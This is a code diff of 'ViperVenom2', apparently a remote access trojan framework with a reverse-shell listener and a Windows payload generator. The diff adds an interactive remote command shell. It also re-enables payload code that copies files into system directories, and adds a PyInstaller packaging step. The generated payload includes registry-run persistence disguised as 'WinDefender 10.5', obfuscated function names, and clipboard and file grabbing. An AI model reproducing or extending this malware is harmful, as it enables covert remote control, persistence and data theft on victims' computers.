@@ -9,7 +9,6 @@ import time
 import platform
 import os
 import threading
-from typing import Set
 from scipy.io.wavfile import *
 import base64
 import random, string
@@ -19,7 +18,6 @@ from cryptography.fernet import Fernet
 import ctypes
 import sys
 from datetime import datetime
-import ipaddress
 now = datetime.today()
 dataaa = (datetime.utcnow().strftime('%Y-%m-%d %H-%M-%S-%f')[:-3])
 def Clear():
@@ -60,23 +58,21 @@ def Menu():
     print(f"""
     {Fore.GREEN}Listeners             Description
     ---------             -----------
-    {Fore.RED}1                      ViperVenom Payload Listener
+    {Fore.RED}1                      ViperVenom payload listener
     """,)
     print(f"""
     {Fore.GREEN}Generators            Description
     ----------            -----------
-    {Fore.RED}2                      ViperVenom Payload Generator
+    {Fore.RED}2                      ViperVenom payload generator
     """,)
     print()
 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-BUFFER_SIZE = 1024
 global ListenerHost
 global ListenerPort
 global file_name
-
-
-def Listener():
+    
+def SingleListener():
     try:
         hostname = socket.gethostname()
         local_ip = socket.gethostbyname(hostname)
@@ -88,13 +84,12 @@ def Listener():
                 print(f'''
                 {Fore.GREEN}Payload                                    Description
                 -------                                     -----------
-                {Fore.RED}1 windows/merciless/tcp_payload             Undetectable ViperVenom Windows Payload
-                
+                {Fore.RED}1 merciless/single/handler                  Merciless single command handler
                 {Fore.BLUE}[*]{Fore.WHITE} Select a payload by typing it's name or "use [Number]" for example: "use 1"
                 ''')
-            if landingHandler == "use windows/vipervenom/tcp/payload" or landingHandler ==  "use 1" or landingHandler == "use vipervenom/tcp/payload" or landingHandler == "vipervenom/tcp/payload" or landingHandler == "windows/vipervenom/tcp/payload":
+            if landingHandler == "use merciless/single/handler" or landingHandler ==  "use 1" or landingHandler == "use merciless/single/handler" or landingHandler == "merciless/single/handler":
                     while True:
-                        firstHandler = input(f"{Fore.WHITE}{Style.BRIGHT}ViperVenom2 {Style.RESET_ALL}{Fore.WHITE}windows{Fore.RED}{Style.BRIGHT}(merciless/tcp_payload){Fore.WHITE}{Style.BRIGHT} > ")
+                        firstHandler = input(f"{Fore.WHITE}{Style.BRIGHT}ViperVenom2 {Style.RESET_ALL}{Fore.WHITE}exploitation{Fore.RED}{Style.BRIGHT}(merciless/single/handler){Fore.WHITE}{Style.BRIGHT} > ")
                         if firstHandler[:8] == "set host":
                             ListenerHost = firstHandler[9:]
                             print(f"Host => {Fore.GREEN}{ListenerHost}")
@@ -169,6 +164,16 @@ def Listener():
                                             conn.send(Handler.encode("utf-8"))
                                         elif Handler == "shutdown":
                                             conn.send(Handler.encode("utf-8"))
+                                        elif Handler == "shell --no-special":
+                                            cmd = input(f"{Fore.RED}{Style.BRIGHT}Merciless Shell{Style.RESET_ALL}{Fore.WHITE} >")
+                                            if cmd == 'quit':
+                                                conn.close()
+                                                s.close()
+                                                sys.exit()
+                                            if len(str.encode(cmd)) > 0:
+                                                conn.send(str.encode(cmd))
+                                                client_response = str(conn.recv(1024),"utf-8")
+                                                print(client_response, end="")
                                         elif Handler == "shell":
                                             conn.send(Handler.encode("utf-8"))
                                             cwd = 'Shell'
@@ -227,6 +232,7 @@ def Listener():
                                                         cwd = r[4:]
                                                     else:
                                                         print (r)
+
     except ConnectionResetError:
         print(f"{Fore.RED}[-]{Fore.WHITE} Lost Connection {Fore.GREEN}[REASON]{Fore.WHITE}: Client Closed Connection.")
     except KeyboardInterrupt:
@@ -254,13 +260,13 @@ def PayloadGenerator():
             if landingHandler == "use windows/merciless/tcp_payload" or landingHandler == "use 1" or landingHandler == "windows/merciless/tcp_payload":
                 while True:
                     firstHandler = input(f"{Fore.WHITE}{Style.BRIGHT}ViperVenomGen2 {Style.RESET_ALL}{Fore.WHITE}windows{Fore.RED}{Style.BRIGHT}(merciless/tcp_payload){Fore.WHITE}{Style.BRIGHT} > ")
-                    if firstHandler[:14] == "set clienthost":
-                        clientHOST = firstHandler[15:]
+                    if firstHandler[:8] == "set host":
+                        clientHOST = firstHandler[9:]
                         print(f"client Host => {Fore.GREEN}{clientHOST}")
                     if firstHandler == "set clienthost":
                         clientHOST = local_ip
                         print(f"client Host => {Fore.GREEN}{clientHOST}")
-                    if firstHandler[:8] == "set clientport":
+                    if firstHandler[:8] == "set port":
                         clientPORT = firstHandler[9:]
                         print(f"client Port => {Fore.GREEN}{clientPORT}")
                     if firstHandler[:13] == "set gmailaddr":
@@ -272,7 +278,6 @@ def PayloadGenerator():
                     if firstHandler[:12] == "set filename":
                         SetFileName = firstHandler[13:]
                         print(f"File Name => {Fore.GREEN}{SetFileName}")
-                        setSleep = firstHandler[13:]
                     if firstHandler[:9] == "set sleep":
                         setSleep = firstHandler[10:]
                         print(f"Sleep => {Fore.GREEN}{setSleep}")
@@ -299,7 +304,7 @@ def PayloadGenerator():
                         print("..")
                         time.sleep(1)
                         print("...")
-                        with open(SetFileName, "wb") as malfile:
+                        with open(SetFileName, "w") as malfile:
                             malfile.write(f'''
 #Eclipse Public License - v 2.0
 #THE ACCOMPANYING PROGRAM IS PROVIDED UNDER THE TERMS OF THIS ECLIPSE
@@ -355,10 +360,10 @@ def zJnWJKrmzwZTAHJT(f_name, path):
     open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
     reg.SetValueEx(open, "WinDefender 10.5", 0, reg.REG_SZ, address)
     reg.CloseKey(open)
-#def XbNcYPeberQMdl(f_name, path):
-    #address=os.path.join(path, f_name)
-    #shutil.copytree(address, "C:\windows\system32", dirs_exist_ok=True)
-    #shutil.copytree(address, "C:\windows", dirs_exist_ok=True)
+def XbNcYPeberQMdl(f_name, path):
+    address=os.path.join(path, f_name)
+    shutil.copytree(address, "C:\windows\system32", dirs_exist_ok=True)
+    shutil.copytree(address, "C:\windows", dirs_exist_ok=True)
 BUFFER_SIZE = 1024
 def connection():
     try:
@@ -427,13 +432,13 @@ def connection():
                                         pass
                                 finally:
                                     CloseClipboard()
-                            #elif command.startswith('merciless'):
-                                #file_name = command[7:]
-                                #pth = os.getcwd()
-                                #try:
-                                    #XbNcYPeberQMdl(file_name, pth)
-                                #except Exception as e:
-                                    #s.send(str(e).encode('utf-8'))
+                            elif command.startswith('merciless'):
+                                file_name = command[7:]
+                                pth = os.getcwd()
+                                try:
+                                    XbNcYPeberQMdl(file_name, pth)
+                                except Exception as e:
+                                    s.send(str(e).encode('utf-8'))
                             elif command.startswith('grab'):
                                 file_name = command[5:]
                                 file_size = os.path.getsize(file_name)
@@ -541,7 +546,9 @@ PTYMEYUXBRwddE()
 ''')
                             if platform.system() == "Windows":
                                 os.system(f"python setup.py build")
-                                os.remove(SetFileName)
+                                #time.sleep(15)
+                            if platform.system() == "Linux":
+                                os.system(f"pyinstaller {SetFileName} --onefile")
                             else:
                                 pass
                             time.sleep(2)
@@ -552,9 +559,9 @@ PTYMEYUXBRwddE()
 while True:
     try:
         des = input(f"{Fore.WHITE}{Style.BRIGHT}ViperVenom2 {Style.RESET_ALL}{Fore.WHITE}landing{Fore.RED}{Style.BRIGHT}(vipervenom/framework){Fore.WHITE}{Style.BRIGHT} > ")
-        if des == "use 1":
-            Listener()
-        if des == "use 2":
+        if des == "use 1" or des == "1":
+            SingleListener()
+        if des == "use 2" or des == "2":
             PayloadGenerator()
         if des == "list show":
             Menu()
